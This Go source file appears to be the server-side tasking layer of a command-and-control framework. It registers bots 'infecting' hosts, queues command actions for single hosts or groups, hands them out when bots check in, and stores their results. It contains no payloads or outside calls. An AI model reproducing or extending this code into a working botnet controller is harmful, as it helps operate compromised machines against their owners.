package main

import (
	"github.com/degenerat3/meteor/core/ent/action"
	"github.com/degenerat3/meteor/core/ent/bot"
	"github.com/degenerat3/meteor/core/ent/group"
	"github.com/degenerat3/meteor/core/ent/host"
	"github.com/degenerat3/meteor/pbuf"
	goUUID "github.com/google/uuid"
	"strconv"
	"time"
)

func regBotUtil(prot *mcs.MCS) int32 {
	uuid := prot.GetUuid()
	intv := prot.GetInterval()
	dlt := prot.GetDelta()
	hn := prot.GetHostname()

	if uuid == "" || intv == 0 || dlt == 0 || hn == "" {
		return 400 // missing param
	}

	hostObj, err := DBClient.Host.Query().Where(host.Hostname(hn)).Only(ctx)

	if err != nil {
		DBClient.Host. // Host Client.
				Create().                // Host create builder.
				SetHostname(hn).         // Set hostname value.
				SetInterface("unknown"). // set interface val
				SetLastSeen(0).          // set last seen
				Save(ctx)                // Create and return.
	}

	_, err = DBClient.Bot.
		Create().
		SetUUID(uuid).
		SetInterval(int(intv)).
		SetDelta(int(dlt)).
		SetInfecting(hostObj).
		SetLastSeen(0).
		Save(ctx)

	if err != nil {
		errLog.Printf("Error registering bot '%s': %s", uuid, err.Error())
		return 500 // error registering bot
	}
	infoLog.Printf("Registered bot: %s\n", uuid)
	return 200

}

func regHostUtil(prot *mcs.MCS) int32 {
	hn := prot.GetHostname()
	ifc := prot.GetInterface()
	if hn == "" || ifc == "" {
		return 400 // missing param
	}
	_, err := DBClient.Host. // Host Client.
					Create().          // Host create builder.
					SetHostname(hn).   // Set hostname value.
					SetInterface(ifc). // set interface val
					SetLastSeen(0).    // set last seen
					Save(ctx)          // Create and return.

	if err != nil {
		errLog.Printf("Error registering host '%s': %s", hn, err.Error())
		return 500 // error registering host
	}
	infoLog.Printf("Registered host: %s\n", hn)
	return 200
}

func regGroupUtil(prot *mcs.MCS) int32 {
	gn := prot.GetGroupname()
	desc := prot.GetDesc()
	if gn == "" || desc == "" {
		return 400
	}

	_, err := DBClient.Group. // Group Client
					Create().      // Group create builder
					SetName(gn).   // Set groupname val
					SetDesc(desc). // set description val
					Save(ctx)

	if err != nil {
		errLog.Printf("Error registering group '%s': %s", gn, err.Error())
		return 500 // error registering group
	}
	infoLog.Printf("Registered group: %s\n", gn)
	return 200
}

func regHGUtil(prot *mcs.MCS) int32 {
	gn := prot.GetGroupname()
	hn := prot.GetHostname()
	if gn == "" || hn == "" {
		return 400 // missing param
	}

	hostObj, err := DBClient.Host.Query().Where(host.Hostname(hn)).Only(ctx)
	if err != nil {
		return 400 // non-registered host
	}
	grpObj, err := DBClient.Group.Query().Where(group.Name(gn)).Only(ctx)
	if err != nil {
		return 400 // non-registered group
	}
	_, err = grpObj.
		Update().
		AddMembers(hostObj).
		Save(ctx)
	if err != nil {
		errLog.Printf("Error adding host '%s' to group '%s': %s", hn, gn, err.Error())
		return 500 // error updating group
	}
	infoLog.Printf("Added host '%s' to group '%s'\n", hn, gn)
	return 200

}

func addActSingleUtil(prot *mcs.MCS) (int32, string) {
	mode := prot.GetMode()
	args := prot.GetArgs()
	hn := prot.GetHostname()
	if mode == "" || args == "" || hn == "" {
		return 400, "" // missing param
	}
	hostObj, err := DBClient.Host.Query().Where(host.Hostname(hn)).Only(ctx)
	if err != nil {
		return 400, "" // non-registered host
	}

	uuid := goUUID.New().String()

	_, err = DBClient.Action.
		Create().
		SetUUID(uuid).
		SetMode(mode).
		SetArgs(args).
		SetTargeting(hostObj).
		Save(ctx)

	if err != nil {
		errLog.Printf("Error adding action '%s' with mode '%s', args '%s': %s", uuid, mode, args, err.Error())
		return 500, "" // error adding action
	}
	infoLog.Printf("Added action '%s' targeting host '%s'\n", args, hn)
	return 200, uuid
}

func addActGroupUtil(prot *mcs.MCS) int32 {
	mode := prot.GetMode()
	args := prot.GetArgs()
	gn := prot.GetGroupname()
	if mode == "" || args == "" || gn == "" {
		return 400 // missing param
	}

	grpObj, err := DBClient.Group.Query().Where(group.Name(gn)).Only(ctx)
	if err != nil {
		return 400 // non-registered group
	}

	hostList, err := grpObj.QueryMembers().All(ctx)
	if err != nil {
		errLog.Printf("Error querying host list: %s", err.Error())
		return 500 // error querying host list
	}

	for _, hostObj := range hostList {
		uuid := goUUID.New().String()

		_, err = DBClient.Action.
			Create().
			SetUUID(uuid).
			SetMode(mode).
			SetArgs(args).
			SetTargeting(hostObj).
			Save(ctx)

		if err != nil {
			errLog.Printf("Error adding action '%s' with mode '%s', args '%s': %s", uuid, mode, args, err.Error())
			return 500 // error adding action
		}
	}
	infoLog.Printf("Added action '%s' targeting group '%s'\n", args, gn)
	return 200
}

func addResultUtil(prot *mcs.MCS) int32 {
	uuid := prot.GetUuid()
	res := prot.GetResult()

	if uuid == "" || res == "" {
		return 400 // missing param
	}

	actObj, err := DBClient.Action.Query().Where(action.UUID(uuid)).Only(ctx)

	_, err = actObj.
		Update().
		SetResult(res).
		SetResponded(true).
		Save(ctx)
	if err != nil {
		errLog.Printf("Error adding result '%s': %s", uuid, err.Error())
		return 500 // error adding result
	}
	infoLog.Printf("Added result for action '%s'\n", uuid)
	return 200

}

func botCheckinUtil(prot *mcs.MCS) (int32, []*mcs.Action) {
	checkTime := int(time.Now().Unix())
	var actList []*mcs.Action
	uuid := prot.GetUuid()
	if uuid == "" {
		return 400, actList // missing param
	}
	botObj, err := DBClient.Bot.Query().Where(bot.UUID(uuid)).Only(ctx)
	if err != nil {
		return 400, actList // unknown bot
	}
	botObj.Update().SetLastSeen(checkTime).Save(ctx)
	hostObj, err := botObj.QueryInfecting().Only(ctx)
	if err != nil {
		return 400, actList // bot assoc w/ unknown host
	}
	hostObj.Update().SetLastSeen(checkTime)
	acts, err := hostObj.QueryActions().Where(action.Queued(false)).All(ctx)
	if err != nil {
		errLog.Printf("Error querying actions: '%s", err.Error())
		return 500, actList // issue querying actions
	}
	if len(acts) == 0 {
		actProto := &mcs.Action{
			Uuid: "None",
			Mode: "None",
			Args: "None",
		}
		actList = append(actList, actProto)
		return 204, actList
	}
	for _, actn := range acts {
		aUUID := actn.UUID
		aMode := actn.Mode
		aArgs := actn.Args
		actn.Update().SetQueued(true).Save(ctx)
		actProto := &mcs.Action{
			Uuid: aUUID,
			Mode: aMode,
			Args: aArgs,
		}
		actList = append(actList, actProto)
	}
	return 200, actList
}

func listBotsUtil() string {
	bots, _ := DBClient.Bot.
		Query().
		All(ctx)

	botListStr := ""
	for _, bot := range bots {
		bstr := bot.String()
		botListStr = botListStr + bstr + "\n"
	}
	return botListStr
}

func listHostsUtil() string {
	hosts, _ := DBClient.Host.
		Query().
		All(ctx)
	hostListStr := ""
	for _, host := range hosts {
		hstr := host.String()
		hostListStr = hostListStr + hstr + "\n"
	}
	return hostListStr
}

func listGroupsUtil() string {
	groups, _ := DBClient.Group.
		Query().
		All(ctx)
	groupListStr := ""
	for _, group := range groups {
		gstr := group.String()
		groupListStr = groupListStr + gstr + "\n"
	}
	return groupListStr
}

func listActionsUtil() string {
	actions, _ := DBClient.Action.
		Query().
		All(ctx)
	actListStr := ""
	for _, act := range actions {
		targ, _ := act.QueryTargeting().Only(ctx)
		astr := act.UUID + ", " + targ.Hostname + ", " + act.Mode + ", " + act.Args + ", Queued: " + strconv.FormatBool(act.Queued) + ", Responded: " + strconv.FormatBool(act.Responded)
		actListStr = actListStr + astr + "\n"
	}
	return actListStr
}

func listResultUtil(uuid string) string {
	action, err := DBClient.Action.
		Query().
		Where(action.UUID(uuid)).
		Only(ctx)
	if err != nil {
		return "Unknown UUID\n"
	}
	if action.Responded != true {
		return "Action not yet returned\n"
	}
	return action.Result
}

func listHostUtil(prot *mcs.MCS) string {
	hn := prot.GetHostname()
	hostobj, err := DBClient.Host.
		Query().
		Where(host.Hostname(hn)).
		Only(ctx)
	if err != nil {
		return "Unknown host"
	}
	ls := convertLastSeen(hostobj.LastSeen)
	grps, err := hostobj.
		QueryMember().
		All(ctx)
	if err != nil {
		return "Error querying host"
	}

	hstr := "Host='" + hn + "', LastSeen='" + ls + "', groups=["

	for _, g := range grps {
		gs := "'" + g.Name + "',"
		hstr = hstr + gs
	}
	hstr = hstr + "]"

	return hstr + "\n"
}

func listGroupUtil(prot *mcs.MCS) string {
	gn := prot.GetGroupname()
	grpobj, err := DBClient.Group.
		Query().
		Where(group.Name(gn)).
		Only(ctx)
	if err != nil {
		return "unknown group"
	}
	grpStr := "Members of " + gn + ":\n"
	mems, err := grpobj.
		QueryMembers().
		All(ctx)
	if err != nil {
		return "Error querying group"
	}
	for _, hst := range mems {
		hstr := "	- " + hst.Hostname + "\n"
		grpStr = grpStr + hstr
	}
	return grpStr + "\n"
}

func convertLastSeen(ls int) string {
	ut := int64(ls)
	t := time.Unix(ut, 0)
	return t.Format(time.UnixDate)
}
